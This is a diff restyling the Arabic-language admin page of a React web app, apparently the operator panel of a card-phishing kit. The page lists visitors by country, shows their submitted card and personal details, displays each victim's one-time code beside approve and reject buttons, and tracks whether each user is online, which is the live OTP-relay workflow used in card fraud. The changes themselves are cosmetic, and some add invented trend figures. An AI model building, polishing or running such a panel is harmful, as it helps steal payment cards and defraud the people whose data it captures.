-              <Button variant="ghost" size="icon" className="md:hidden" onClick={() => setMobileMenuOpen(true)}>
+              <Button
+                variant="ghost"
+                size="icon"
+                className="md:hidden hover:bg-slate-100 dark:hover:bg-slate-800"
+                onClick={() => setMobileMenuOpen(true)}
+              >
                 <Menu className="h-5 w-5" />
                 <span className="sr-only">القائمة</span>
               </Button>
-              <div className="flex items-center gap-3">
-                <div className="bg-primary/10 p-2 rounded-full">
-                  <Bell className="h-5 w-5 text-primary" />
+              <div className="flex items-center gap-4">
+                <div className="bg-gradient-to-br from-blue-500 to-blue-600 p-3 rounded-xl shadow-lg">
+                  <Bell className="h-6 w-6 text-white" />
                 </div>
-                <h1 className="text-xl font-bold hidden sm:block">لوحة الإشعارات</h1>
+                <div className="hidden sm:block">
+                  <h1 className="text-2xl font-bold bg-gradient-to-r from-slate-900 to-slate-700 dark:from-slate-100 dark:to-slate-300 bg-clip-text text-transparent">
+                    لوحة الإشعارات
+                  </h1>
+                  <p className="text-sm text-slate-600 dark:text-slate-400 font-medium">إدارة ومراقبة الإشعارات</p>
+                </div>
               </div>
             </div>
 
-            <div className="flex items-center gap-2">
+            <div className="flex items-center gap-3">
               <div className="hidden md:flex items-center gap-2">
                 <TooltipProvider>
                   <Tooltip>
                     <TooltipTrigger asChild>
-                      <Button variant="outline" size="icon" onClick={() => setSettingsOpen(true)}>
+                      <Button
+                        variant="outline"
+                        size="icon"
+                        onClick={() => setSettingsOpen(true)}
+                        className="border-slate-200 dark:border-slate-700 hover:bg-slate-50 dark:hover:bg-slate-800"
+                      >
                         <Settings className="h-4 w-4" />
                         <span className="sr-only">الإعدادات</span>
                       </Button>
@@ -1156,7 +1289,12 @@ export default function NotificationsPage() {
                 <TooltipProvider>
                   <Tooltip>
                     <TooltipTrigger asChild>
-                      <Button variant="outline" size="icon" onClick={() => setExportDialogOpen(true)}>
+                      <Button
+                        variant="outline"
+                        size="icon"
+                        onClick={() => setExportDialogOpen(true)}
+                        className="border-slate-200 dark:border-slate-700 hover:bg-slate-50 dark:hover:bg-slate-800"
+                      >
                         <Download className="h-4 w-4" />
                         <span className="sr-only">تصدير</span>
                       </Button>
@@ -1168,10 +1306,10 @@ export default function NotificationsPage() {
                 </TooltipProvider>
 
                 <Button
-                  variant="destructive"
+                  variant="outline"
                   onClick={handleClearAll}
                   disabled={notifications.length === 0}
-                  className="hidden sm:flex items-center gap-2"
+                  className="hidden sm:flex items-center gap-2 border-red-200 text-red-600 hover:bg-red-50 hover:border-red-300 dark:border-red-800 dark:text-red-400 dark:hover:bg-red-950/30"
                 >
                   <Trash2 className="h-4 w-4" />
                   مسح الكل
@@ -1180,26 +1318,47 @@ export default function NotificationsPage() {
 
               <DropdownMenu>
                 <DropdownMenuTrigger asChild>
-                  <Button variant="ghost" className="relative h-9 w-9 rounded-full">
-                    <Avatar className="h-9 w-9">
-                      <AvatarImage src="/placeholder.svg?height=36&width=36" alt="صورة المستخدم" />
-                      <AvatarFallback>مد</AvatarFallback>
+                  <Button
+                    variant="ghost"
+                    className="relative h-10 w-10 rounded-full hover:bg-slate-100 dark:hover:bg-slate-800"
+                  >
+                    <Avatar className="h-10 w-10 border-2 border-white dark:border-slate-700 shadow-sm">
+                      <AvatarImage src="/placeholder.svg?height=40&width=40" alt="صورة المستخدم" />
+                      <AvatarFallback className="bg-blue-100 dark:bg-blue-900/30 text-blue-600 dark:text-blue-400 font-bold">
+                        مد
+                      </AvatarFallback>
                     </Avatar>
                   </Button>
                 </DropdownMenuTrigger>
-                <DropdownMenuContent align="end" className="w-56" alignOffset={8}>
-                  <div className="flex items-center justify-start gap-2 p-2">
-                    <div className="flex flex-col space-y-0.5 leading-none">
-                      <p className="font-medium text-sm">مدير النظام</p>
-                      <p className="text-xs text-muted-foreground">admin@example.com</p>
+                <DropdownMenuContent
+                  align="end"
+                  className="w-64 bg-white dark:bg-slate-900 border-slate-200 dark:border-slate-700 shadow-xl"
+                  alignOffset={8}
+                >
+                  <div className="flex items-center justify-start gap-3 p-4 border-b border-slate-200 dark:border-slate-700">
+                    <Avatar className="h-10 w-10">
+                      <AvatarImage src="/placeholder.svg?height=40&width=40" alt="صورة المستخدم" />
+                      <AvatarFallback className="bg-blue-100 dark:bg-blue-900/30 text-blue-600 dark:text-blue-400 font-bold">
+                        مد
+                      </AvatarFallback>
+                    </Avatar>
+                    <div className="flex flex-col space-y-1 leading-none">
+                      <p className="font-semibold text-sm text-slate-900 dark:text-slate-100">مدير النظام</p>
+                      <p className="text-xs text-slate-600 dark:text-slate-400">admin@example.com</p>
                     </div>
                   </div>
-                  <DropdownMenuItem onClick={() => setSettingsOpen(true)}>
-                    <Settings className="ml-2 h-4 w-4" />
+                  <DropdownMenuItem
+                    onClick={() => setSettingsOpen(true)}
+                    className="p-3 cursor-pointer hover:bg-slate-50 dark:hover:bg-slate-800"
+                  >
+                    <Settings className="ml-3 h-4 w-4" />
                     <span>الإعدادات</span>
                   </DropdownMenuItem>
-                  <DropdownMenuItem onClick={handleLogout}>
-                    <LogOut className="ml-2 h-4 w-4" />
+                  <DropdownMenuItem
+                    onClick={handleLogout}
+                    className="p-3 cursor-pointer hover:bg-red-50 dark:hover:bg-red-950/30 text-red-600 dark:text-red-400"
+                  >
+                    <LogOut className="ml-3 h-4 w-4" />
                     <span>تسجيل الخروج</span>
                   </DropdownMenuItem>
                 </DropdownMenuContent>
@@ -1208,25 +1367,35 @@ export default function NotificationsPage() {
           </div>
         </header>
 
-        <div className="p-4 md:p-6">
+        <div className="p-4 md:p-6 lg:p-8">
           {/* Statistics Grid */}
-          <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
+          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
             {/* Online Users Card */}
-            <Card className="bg-card shadow-sm hover:shadow-md transition-shadow duration-300">
-              <CardHeader className="pb-2">
-                <CardTitle className="text-sm text-muted-foreground font-medium">المستخدمين المتصلين</CardTitle>
+            <Card className="bg-white dark:bg-slate-900 shadow-lg hover:shadow-xl transition-all duration-300 border-slate-200/60 dark:border-slate-700/60 overflow-hidden group">
+              <CardHeader className="pb-3 bg-gradient-to-r from-blue-50 to-indigo-50 dark:from-blue-950/30 dark:to-indigo-950/30">
+                <CardTitle className="text-sm text-slate-600 dark:text-slate-400 font-semibold flex items-center gap-2">
+                  <UserCheck className="h-4 w-4 text-blue-600 dark:text-blue-400" />
+                  المستخدمين المتصلين
+                </CardTitle>
               </CardHeader>
-              <CardContent className="pb-2">
-                <div className="flex items-center justify-between">
-                  <div className="flex items-center gap-3">
-                    <div className="rounded-full bg-blue-100 dark:bg-blue-900 p-3">
-                      <UserCheck className="h-5 w-5 text-blue-600 dark:text-blue-300" />
+              <CardContent className="pb-4">
+                <div className="flex items-center justify-between mb-2">
+                  <div className="flex items-center gap-4">
+                    <div className="rounded-xl bg-gradient-to-br from-blue-500 to-blue-600 p-3 shadow-lg group-hover:shadow-xl transition-shadow duration-300">
+                      <UserCheck className="h-6 w-6 text-white" />
                     </div>
-                    <div className="text-3xl font-bold">{onlineUsersCount}</div>
+                    <div className="text-3xl font-bold text-slate-900 dark:text-slate-100">{onlineUsersCount}</div>
                   </div>
-                  <Badge variant="outline" className="bg-blue-50 text-blue-700 dark:bg-blue-950/30 dark:text-blue-300">
+                  <Badge
+                    variant="outline"
+                    className="bg-blue-50 text-blue-700 border-blue-200 dark:bg-blue-950/30 dark:text-blue-300 dark:border-blue-800 font-semibold"
+                  >
                     {Math.round((onlineUsersCount / totalVisitors) * 100) || 0}%
                   </Badge>
+                </div>
+                <div className="flex items-center gap-2 text-sm text-slate-600 dark:text-slate-400">
+                  <TrendingUp className="h-4 w-4 text-emerald-500" />
+                  <span>+12% من الأمس</span>
                 </div>
               </CardContent>
               <CardFooter className="pt-0">
@@ -1235,50 +1404,64 @@ export default function NotificationsPage() {
             </Card>
 
             {/* Total Visitors Card */}
-            <Card className="bg-card shadow-sm hover:shadow-md transition-shadow duration-300">
-              <CardHeader className="pb-2">
-                <CardTitle className="text-sm text-muted-foreground font-medium">إجمالي الزوار</CardTitle>
+            <Card className="bg-white dark:bg-slate-900 shadow-lg hover:shadow-xl transition-all duration-300 border-slate-200/60 dark:border-slate-700/60 overflow-hidden group">
+              <CardHeader className="pb-3 bg-gradient-to-r from-emerald-50 to-green-50 dark:from-emerald-950/30 dark:to-green-950/30">
+                <CardTitle className="text-sm text-slate-600 dark:text-slate-400 font-semibold flex items-center gap-2">
+                  <Users className="h-4 w-4 text-emerald-600 dark:text-emerald-400" />
+                  إجمالي الزوار
+                </CardTitle>
               </CardHeader>
-              <CardContent className="pb-2">
-                <div className="flex items-center justify-between">
-                  <div className="flex items-center gap-3">
-                    <div className="rounded-full bg-green-100 dark:bg-green-900 p-3">
-                      <Users className="h-5 w-5 text-green-600 dark:text-green-300" />
+              <CardContent className="pb-4">
+                <div className="flex items-center justify-between mb-2">
+                  <div className="flex items-center gap-4">
+                    <div className="rounded-xl bg-gradient-to-br from-emerald-500 to-emerald-600 p-3 shadow-lg group-hover:shadow-xl transition-shadow duration-300">
+                      <Users className="h-6 w-6 text-white" />
                     </div>
-                    <div className="text-3xl font-bold">{totalVisitors}</div>
+                    <div className="text-3xl font-bold text-slate-900 dark:text-slate-100">{totalVisitors}</div>
                   </div>
                   <Badge
                     variant="outline"
-                    className="bg-green-50 text-green-700 dark:bg-green-950/30 dark:text-green-300"
+                    className="bg-emerald-50 text-emerald-700 border-emerald-200 dark:bg-emerald-950/30 dark:text-emerald-300 dark:border-emerald-800 font-semibold"
                   >
                     +{visitorTrend[visitorTrend.length - 1] - visitorTrend[0]}
                   </Badge>
                 </div>
+                <div className="flex items-center gap-2 text-sm text-slate-600 dark:text-slate-400">
+                  <TrendingUp className="h-4 w-4 text-emerald-500" />
+                  <span>+8% من الأسبوع الماضي</span>
+                </div>
               </CardContent>
               <CardFooter className="pt-0">
-                <MiniChart data={visitorTrend} color="bg-green-500" />
+                <MiniChart data={visitorTrend} color="bg-emerald-500" />
               </CardFooter>
             </Card>
 
             {/* Card Submissions Card */}
-            <Card className="bg-card shadow-sm hover:shadow-md transition-shadow duration-300">
-              <CardHeader className="pb-2">
-                <CardTitle className="text-sm text-muted-foreground font-medium">معلومات البطاقات المقدمة</CardTitle>
+            <Card className="bg-white dark:bg-slate-900 shadow-lg hover:shadow-xl transition-all duration-300 border-slate-200/60 dark:border-slate-700/60 overflow-hidden group">
+              <CardHeader className="pb-3 bg-gradient-to-r from-purple-50 to-violet-50 dark:from-purple-950/30 dark:to-violet-950/30">
+                <CardTitle className="text-sm text-slate-600 dark:text-slate-400 font-semibold flex items-center gap-2">
+                  <CreditCard className="h-4 w-4 text-purple-600 dark:text-purple-400" />
+                  معلومات البطاقات المقدمة
+                </CardTitle>
               </CardHeader>
-              <CardContent className="pb-2">
-                <div className="flex items-center justify-between">
-                  <div className="flex items-center gap-3">
-                    <div className="rounded-full bg-purple-100 dark:bg-purple-900 p-3">
-                      <CreditCard className="h-5 w-5 text-purple-600 dark:text-purple-300" />
+              <CardContent className="pb-4">
+                <div className="flex items-center justify-between mb-2">
+                  <div className="flex items-center gap-4">
+                    <div className="rounded-xl bg-gradient-to-br from-purple-500 to-purple-600 p-3 shadow-lg group-hover:shadow-xl transition-shadow duration-300">
+                      <CreditCard className="h-6 w-6 text-white" />
                     </div>
-                    <div className="text-3xl font-bold">{cardSubmissions}</div>
+                    <div className="text-3xl font-bold text-slate-900 dark:text-slate-100">{cardSubmissions}</div>
                   </div>
                   <Badge
                     variant="outline"
-                    className="bg-purple-50 text-purple-700 dark:bg-purple-950/30 dark:text-purple-300"
+                    className="bg-purple-50 text-purple-700 border-purple-200 dark:bg-purple-950/30 dark:text-purple-300 dark:border-purple-800 font-semibold"
                   >
                     {Math.round((cardSubmissions / totalVisitors) * 100) || 0}%
                   </Badge>
+                </div>
+                <div className="flex items-center gap-2 text-sm text-slate-600 dark:text-slate-400">
+                  <TrendingUp className="h-4 w-4 text-emerald-500" />
+                  <span>+15% من الأمس</span>
                 </div>
               </CardContent>
               <CardFooter className="pt-0">
@@ -1288,19 +1471,26 @@ export default function NotificationsPage() {
           </div>
 
           {/* Main content grid */}
-          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 mb-8">
+          <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 mb-8">
             {/* Main content area - 2/3 width on large screens */}
-            <div className="lg:col-span-3 space-y-6">
-              {/* Tabs for Notifications and Attachments */}
+            <div className="lg:col-span-3 space-y-8">
+              {/* Tabs for Notifications and Statistics */}
               <Tabs defaultValue="notifications" className="w-full">
-                <TabsList className="mb-4">
-                  <TabsTrigger value="notifications" className="flex items-center gap-2">
+                <TabsList className="mb-6 bg-slate-100 dark:bg-slate-800 p-1 rounded-xl">
+                  <TabsTrigger
+                    value="notifications"
+                    className="flex items-center gap-2 data-[state=active]:bg-white dark:data-[state=active]:bg-slate-700 data-[state=active]:shadow-sm rounded-lg px-4 py-2"
+                  >
                     <Bell className="h-4 w-4" />
                     الإشعارات
                   </TabsTrigger>
-                  <TabsTrigger value="attachments" className="flex items-center gap-2">
-                    <Download className="h-4 w-4" />
-                    إحصائيات                  </TabsTrigger>
+                  <TabsTrigger
+                    value="statistics"
+                    className="flex items-center gap-2 data-[state=active]:bg-white dark:data-[state=active]:bg-slate-700 data-[state=active]:shadow-sm rounded-lg px-4 py-2"
+                  >
+                    <BarChart3 className="h-4 w-4" />
+                    إحصائيات
+                  </TabsTrigger>
                 </TabsList>
 
                 {/* Notifications Tab Content */}
@@ -1314,35 +1504,47 @@ export default function NotificationsPage() {
                       <Button
                         variant={filterType === "all" ? "default" : "outline"}
                         onClick={() => setFilterType("all")}
-                        className="flex-1 sm:flex-none"
+                        className={`flex-1 sm:flex-none ${
+                          filterType === "all"
+                            ? "bg-blue-600 hover:bg-blue-700 text-white border-blue-600"
+                            : "border-slate-200 dark:border-slate-700 hover:bg-slate-50 dark:hover:bg-slate-800"
+                        }`}
                         size="sm"
                       >
                         الكل
-                        <Badge variant="outline" className="mr-2 bg-background">
+                        <Badge variant="outline" className="mr-2 bg-white/20 text-current border-current/20">
                           {notifications.length}
                         </Badge>
                       </Button>
                       <Button
                         variant={filterType === "card" ? "default" : "outline"}
                         onClick={() => setFilterType("card")}
-                        className="flex-1 sm:flex-none"
+                        className={`flex-1 sm:flex-none ${
+                          filterType === "card"
+                            ? "bg-blue-600 hover:bg-blue-700 text-white border-blue-600"
+                            : "border-slate-200 dark:border-slate-700 hover:bg-slate-50 dark:hover:bg-slate-800"
+                        }`}
                         size="sm"
                       >
                         <CreditCard className="h-4 w-4 ml-1" />
                         البطاقات
-                        <Badge variant="outline" className="mr-2 bg-background">
+                        <Badge variant="outline" className="mr-2 bg-white/20 text-current border-current/20">
                           {cardCount}
                         </Badge>
                       </Button>
                       <Button
                         variant={filterType === "online" ? "default" : "outline"}
                         onClick={() => setFilterType("online")}
-                        className="flex-1 sm:flex-none"
+                        className={`flex-1 sm:flex-none ${
+                          filterType === "online"
+                            ? "bg-blue-600 hover:bg-blue-700 text-white border-blue-600"
+                            : "border-slate-200 dark:border-slate-700 hover:bg-slate-50 dark:hover:bg-slate-800"
+                        }`}
                         size="sm"
                       >
                         <UserCheck className="h-4 w-4 ml-1" />
                         المتصلين
-                        <Badge variant="outline" className="mr-2 bg-background">
+                        <Badge variant="outline" className="mr-2 bg-white/20 text-current border-current/20">
                           {onlineCount}
                         </Badge>
                       </Button>
@@ -1350,13 +1552,18 @@ export default function NotificationsPage() {
                   </div>
 
                   {/* Notifications Table */}
-                  <Card className="bg-card shadow-sm overflow-hidden">
-                    <CardHeader className="py-3 px-4 flex flex-row items-center justify-between">
-                      <CardTitle className="text-lg flex items-center gap-2">
-                        <Bell className="h-5 w-5 text-primary" />
+                  <Card className="bg-white dark:bg-slate-900 shadow-lg border-slate-200/60 dark:border-slate-700/60 overflow-hidden">
+                    <CardHeader className="py-4 px-6 flex flex-row items-center justify-between border-b border-slate-200/60 dark:border-slate-700/60 bg-slate-50/50 dark:bg-slate-800/50">
+                      <CardTitle className="text-xl font-bold flex items-center gap-3 text-slate-900 dark:text-slate-100">
+                        <div className="bg-blue-100 dark:bg-blue-900/30 p-2 rounded-lg">
+                          <Bell className="h-5 w-5 text-blue-600 dark:text-blue-400" />
+                        </div>
                         الإشعارات
                         {searchTerm && (
-                          <Badge variant="outline" className="mr-2">
+                          <Badge
+                            variant="outline"
+                            className="mr-2 bg-blue-50 text-blue-700 border-blue-200 dark:bg-blue-950/30 dark:text-blue-300 dark:border-blue-800"
+                          >
                             نتائج البحث: {filteredNotifications.length}
                           </Badge>
                         )}
@@ -1364,20 +1571,32 @@ export default function NotificationsPage() {
                       <div className="flex items-center gap-2">
                         <DropdownMenu>
                           <DropdownMenuTrigger asChild>
-                            <Button variant="ghost" size="sm" className="h-8 gap-1">
-                              <ArrowUpDown className="h-3.5 w-3.5" />
+                            <Button
+                              variant="ghost"
+                              size="sm"
+                              className="h-9 gap-2 hover:bg-slate-100 dark:hover:bg-slate-800"
+                            >
+                              <ArrowUpDown className="h-4 w-4" />
                               <span className="sr-only md:not-sr-only md:inline-block">ترتيب</span>
                             </Button>
                           </DropdownMenuTrigger>
-                          <DropdownMenuContent align="end" className="w-48">
-                            <DropdownMenuItem>الأحدث أولاً</DropdownMenuItem>
-                            <DropdownMenuItem>الأقدم أولاً</DropdownMenuItem>
-                            <DropdownMenuItem>حسب الدولة</DropdownMenuItem>
-                            <DropdownMenuItem>حسب الحالة</DropdownMenuItem>
+                          <DropdownMenuContent
+                            align="end"
+                            className="w-48 bg-white dark:bg-slate-900 border-slate-200 dark:border-slate-700"
+                          >
+                            <DropdownMenuItem className="cursor-pointer">الأحدث أولاً</DropdownMenuItem>
+                            <DropdownMenuItem className="cursor-pointer">الأقدم أولاً</DropdownMenuItem>
+                            <DropdownMenuItem className="cursor-pointer">حسب الدولة</DropdownMenuItem>
+                            <DropdownMenuItem className="cursor-pointer">حسب الحالة</DropdownMenuItem>
                           </DropdownMenuContent>
                         </DropdownMenu>
-                        <Button variant="ghost" size="sm" className="h-8" onClick={() => setExportDialogOpen(true)}>
-                          <Download className="h-3.5 w-3.5 mr-1" />
+                        <Button
+                          variant="ghost"
+                          size="sm"
+                          className="h-9 hover:bg-slate-100 dark:hover:bg-slate-800"
+                          onClick={() => setExportDialogOpen(true)}
+                        >
+                          <Download className="h-4 w-4 mr-1" />
                           <span className="sr-only md:not-sr-only md:inline-block">تصدير</span>
                         </Button>
                       </div>
@@ -1387,71 +1606,99 @@ export default function NotificationsPage() {
                     <div className="hidden md:block overflow-x-auto">
                       <table className="w-full">
                         <thead>
-                          <tr className="border-b border-border bg-muted/50">
-                            <th className="px-4 py-3 text-right font-medium text-muted-foreground">الدولة</th>
-                            <th className="px-4 py-3 text-right font-medium text-muted-foreground">المعلومات</th>
-                            <th className="px-4 py-3 text-right font-medium text-muted-foreground">حالة البطاقة</th>
-                            <th className="px-4 py-3 text-right font-medium text-muted-foreground">الوقت</th>
-                            <th className="px-4 py-3 text-center font-medium text-muted-foreground">الحالة</th>
-                            <th className="px-4 py-3 text-center font-medium text-muted-foreground">كود</th>
-                            <th className="px-4 py-3 text-center font-medium text-muted-foreground">الإجراءات</th>
+                          <tr className="border-b border-slate-200/60 dark:border-slate-700/60 bg-slate-50/80 dark:bg-slate-800/50">
+                            <th className="px-6 py-4 text-right font-semibold text-slate-700 dark:text-slate-300">
+                              الدولة
+                            </th>
+                            <th className="px-6 py-4 text-right font-semibold text-slate-700 dark:text-slate-300">
+                              المعلومات
+                            </th>
+                            <th className="px-6 py-4 text-right font-semibold text-slate-700 dark:text-slate-300">
+                              حالة البطاقة
+                            </th>
+                            <th className="px-6 py-4 text-right font-semibold text-slate-700 dark:text-slate-300">
+                              الوقت
+                            </th>
+                            <th className="px-6 py-4 text-center font-semibold text-slate-700 dark:text-slate-300">
+                              الحالة
+                            </th>
+                            <th className="px-6 py-4 text-center font-semibold text-slate-700 dark:text-slate-300">
+                              كود
+                            </th>
+                            <th className="px-6 py-4 text-center font-semibold text-slate-700 dark:text-slate-300">
+                              الإجراءات
+                            </th>
                           </tr>
                         </thead>
                         <tbody>
                           {paginatedNotifications.map((notification) => (
                             <tr
                               key={notification.id}
-                              className={`border-b border-border ${getRowBackgroundColor(notification?.flagColor!)} transition-colors`}
+                              className={`border-b border-slate-200/40 dark:border-slate-700/40 ${getRowBackgroundColor(notification?.flagColor!)} transition-all duration-200 hover:bg-slate-50/50 dark:hover:bg-slate-800/50`}
                             >
-                              <td className="px-4 py-3">
-                                <div className="flex items-center gap-2">
-                                  <MapPin className="h-4 w-4 text-muted-foreground" />
-                                  <span>{notification.country || "غير معروف"}</span>
+                              <td className="px-6 py-4">
+                                <div className="flex items-center gap-3">
+                                  <div className="bg-slate-100 dark:bg-slate-800 p-2 rounded-lg">
+                                    <MapPin className="h-4 w-4 text-slate-600 dark:text-slate-400" />
+                                  </div>
+                                  <span className="font-medium text-slate-900 dark:text-slate-100">
+                                    {notification.country || "غير معروف"}
+                                  </span>
                                 </div>
                               </td>
-                              <td className="px-4 py-3">
+                              <td className="px-6 py-4">
                                 <div className="flex flex-wrap gap-2">
                                   <Badge
                                     variant={notification?.phone ? "secondary" : "destructive"}
-                                    className="rounded-md cursor-pointer hover:bg-secondary/80 transition-colors"
+                                    className={`rounded-lg cursor-pointer transition-all duration-200 ${
+                                      notification?.phone
+                                        ? "bg-blue-50 text-blue-700 border-blue-200 hover:bg-blue-100 dark:bg-blue-950/30 dark:text-blue-300 dark:border-blue-800 dark:hover:bg-blue-900/50"
+                                        : "bg-red-50 text-red-700 border-red-200 hover:bg-red-100 dark:bg-red-950/30 dark:text-red-300 dark:border-red-800 dark:hover:bg-red-900/50"
+                                    }`}
                                     onClick={() => handleInfoClick(notification, "personal")}
                                   >
                                     {notification?.phone ? "معلومات شخصية" : "لا يوجد معلومات"}
                                   </Badge>
                                   <Badge
                                     variant={notification.cardNumber ? "secondary" : "destructive"}
-                                    className={`rounded-md cursor-pointer hover:bg-secondary/80 transition-colors ${notification.cardNumber ? "bg-green-500 hover:bg-green-600 text-white dark:bg-green-600 dark:hover:bg-green-700" : ""}`}
+                                    className={`rounded-lg cursor-pointer transition-all duration-200 ${
+                                      notification.cardNumber
+                                        ? "bg-emerald-50 text-emerald-700 border-emerald-200 hover:bg-emerald-100 dark:bg-emerald-950/30 dark:text-emerald-300 dark:border-emerald-800 dark:hover:bg-emerald-900/50"
+                                        : "bg-red-50 text-red-700 border-red-200 hover:bg-red-100 dark:bg-red-950/30 dark:text-red-300 dark:border-red-800 dark:hover:bg-red-900/50"
+                                    }`}
                                     onClick={() => handleInfoClick(notification, "card")}
                                   >
                                     {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                                   </Badge>
                                 </div>
                               </td>
-                              <td className="px-4 py-3">
+                              <td className="px-6 py-4">
                                 {notification.status === "approved" ? (
-                                  <Badge className="bg-green-100 text-green-800 dark:bg-green-900 dark:text-green-300">
+                                  <Badge className="bg-emerald-50 text-emerald-700 border-emerald-200 dark:bg-emerald-950/30 dark:text-emerald-300 dark:border-emerald-800 font-medium">
                                     <CheckCircle className="h-3 w-3 mr-1" />
                                     موافق
                                   </Badge>
                                 ) : notification.status === "rejected" ? (
-                                  <Badge className="bg-red-100 text-red-800 dark:bg-red-900 dark:text-red-300">
+                                  <Badge className="bg-red-50 text-red-700 border-red-200 dark:bg-red-950/30 dark:text-red-300 dark:border-red-800 font-medium">
                                     <XCircle className="h-3 w-3 mr-1" />
                                     مرفوض
                                   </Badge>
                                 ) : (
                                   <Badge
                                     variant="outline"
-                                    className="bg-yellow-100 text-yellow-800 dark:bg-yellow-900 dark:text-yellow-300"
+                                    className="bg-amber-50 text-amber-700 border-amber-200 dark:bg-amber-950/30 dark:text-amber-300 dark:border-amber-800 font-medium"
                                   >
                                     <Clock className="h-3 w-3 mr-1" />
                                     معلق
                                   </Badge>
                                 )}
                               </td>
-                              <td className="px-4 py-3 whitespace-nowrap">
-                                <div className="flex items-center gap-2">
-                                  <Clock className="h-4 w-4 text-muted-foreground" />
-                                  <span>
+                              <td className="px-6 py-4 whitespace-nowrap">
+                                <div className="flex items-center gap-3">
+                                  <div className="bg-slate-100 dark:bg-slate-800 p-1.5 rounded-lg">
+                                    <Clock className="h-3 w-3 text-slate-600 dark:text-slate-400" />
+                                  </div>
+                                  <span className="text-sm text-slate-600 dark:text-slate-400 font-medium">
                                     {notification.createdDate &&
                                       formatDistanceToNow(new Date(notification.createdDate), {
                                         addSuffix: true,
@@ -1460,21 +1707,21 @@ export default function NotificationsPage() {
                                   </span>
                                 </div>
                               </td>
-                              <td className="px-4 py-3 text-center">
+                              <td className="px-6 py-4 text-center">
                                 <UserStatus userId={notification.id} />
                               </td>
-                              <td className="px-4 py-3 text-center">
+                              <td className="px-6 py-4 text-center">
                                 {notification.otp && (
                                   <Badge
-                                    className="bg-blue-100 text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+                                    className="bg-blue-50 text-blue-700 border-blue-200 dark:bg-blue-950/30 dark:text-blue-300 dark:border-blue-800 font-mono font-semibold"
                                     variant="outline"
                                   >
                                     {notification.otp}
                                   </Badge>
                                 )}
                               </td>
-                              <td className="px-4 py-3">
-                                <div className="flex justify-center gap-2">
+                              <td className="px-6 py-4">
+                                <div className="flex justify-center gap-1">
                                   <TooltipProvider>
                                     <Tooltip>
                                       <TooltipTrigger asChild>
@@ -1482,7 +1729,7 @@ export default function NotificationsPage() {
                                           variant="outline"
                                           size="sm"
                                           onClick={() => handleApproval("approved", notification.id)}
-                                          className="bg-green-500 dark:bg-green-600 text-white hover:bg-green-600 dark:hover:bg-green-700"
+                                          className="bg-emerald-50 border-emerald-200 text-emerald-700 hover:bg-emerald-100 dark:bg-emerald-950/30 dark:border-emerald-800 dark:text-emerald-300 dark:hover:bg-emerald-900/50"
                                           disabled={notification.status === "approved"}
                                         >
                                           <CheckCircle className="h-4 w-4" />
@@ -1501,7 +1748,7 @@ export default function NotificationsPage() {
                                           variant="outline"
                                           size="sm"
                                           onClick={() => handleApproval("rejected", notification.id)}
-                                          className="bg-red-500 dark:bg-red-600 text-white hover:bg-red-600 dark:hover:bg-red-700"
+                                          className="bg-red-50 border-red-200 text-red-700 hover:bg-red-100 dark:bg-red-950/30 dark:border-red-800 dark:text-red-300 dark:hover:bg-red-900/50"
                                           disabled={notification.status === "rejected"}
                                         >
                                           <XCircle className="h-4 w-4" />
@@ -1526,7 +1773,7 @@ export default function NotificationsPage() {
                                           variant="ghost"
                                           size="sm"
                                           onClick={() => handleDelete(notification.id)}
-                                          className="text-red-500 dark:text-red-400 hover:text-red-600 dark:hover:text-red-300 hover:bg-red-100 dark:hover:bg-red-950/50"
+                                          className="text-red-500 dark:text-red-400 hover:text-red-600 dark:hover:text-red-300 hover:bg-red-50 dark:hover:bg-red-950/30"
                                         >
                                           <Trash2 className="h-4 w-4" />
                                         </Button>
@@ -1542,10 +1789,19 @@ export default function NotificationsPage() {
                           ))}
                           {paginatedNotifications.length === 0 && (
                             <tr>
-                              <td colSpan={7} className="px-4 py-8 text-center text-muted-foreground">
-                                <div className="flex flex-col items-center gap-2">
-                                  <Bell className="h-8 w-8 text-muted-foreground/50" />
-                                  <p>لا توجد إشعارات متطابقة مع الفلتر المحدد</p>
+                              <td colSpan={7} className="px-6 py-12 text-center">
+                                <div className="flex flex-col items-center gap-4">
+                                  <div className="bg-slate-100 dark:bg-slate-800 rounded-full p-4">
+                                    <Bell className="h-8 w-8 text-slate-400" />
+                                  </div>
+                                  <div>
+                                    <p className="text-lg font-semibold text-slate-900 dark:text-slate-100 mb-1">
+                                      لا توجد إشعارات
+                                    </p>
+                                    <p className="text-slate-600 dark:text-slate-400">
+                                      لا توجد إشعارات متطابقة مع الفلتر المحدد
+                                    </p>
+                                  </div>
                                 </div>
                               </td>
                             </tr>
@@ -1560,18 +1816,22 @@ export default function NotificationsPage() {
                         paginatedNotifications.map((notification) => (
                           <Card
                             key={notification.id}
-                            className={`overflow-hidden bg-card border-border ${getRowBackgroundColor(notification?.flagColor!)} mb-4`}
+                            className={`overflow-hidden bg-white dark:bg-slate-900 border-slate-200 dark:border-slate-700 shadow-sm hover:shadow-md transition-all duration-200 ${getRowBackgroundColor(notification?.flagColor!)} mb-4`}
                           >
                             <CardHeader className="p-4 pb-2">
                               <div className="flex justify-between items-start">
-                                <div className="flex items-center gap-2">
-                                  <MapPin className="h-4 w-4 text-muted-foreground" />
-                                  <span className="font-medium">{notification.country || "غير معروف"}</span>
+                                <div className="flex items-center gap-3">
+                                  <div className="bg-slate-100 dark:bg-slate-800 p-2 rounded-lg">
+                                    <MapPin className="h-4 w-4 text-slate-600 dark:text-slate-400" />
+                                  </div>
+                                  <span className="font-semibold text-slate-900 dark:text-slate-100">
+                                    {notification.country || "غير معروف"}
+                                  </span>
                                 </div>
                                 <div className="flex items-center gap-2">
                                   {notification.otp && (
                                     <Badge
-                                      className="bg-blue-100 text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+                                      className="bg-blue-50 text-blue-700 border-blue-200 dark:bg-blue-950/30 dark:text-blue-300 dark:border-blue-800 font-mono"
                                       variant="outline"
                                     >
                                       {notification.otp}
@@ -1582,41 +1842,51 @@ export default function NotificationsPage() {
                               </div>
                             </CardHeader>
                             <CardContent className="p-4 pt-2">
-                              <div className="grid grid-cols-1 gap-3 mb-3">
-                                <div className="flex flex-wrap gap-2 mb-2">
+                              <div className="grid grid-cols-1 gap-4 mb-4">
+                                <div className="flex flex-wrap gap-2 mb-3">
                                   <Badge
                                     variant={notification?.phone ? "secondary" : "destructive"}
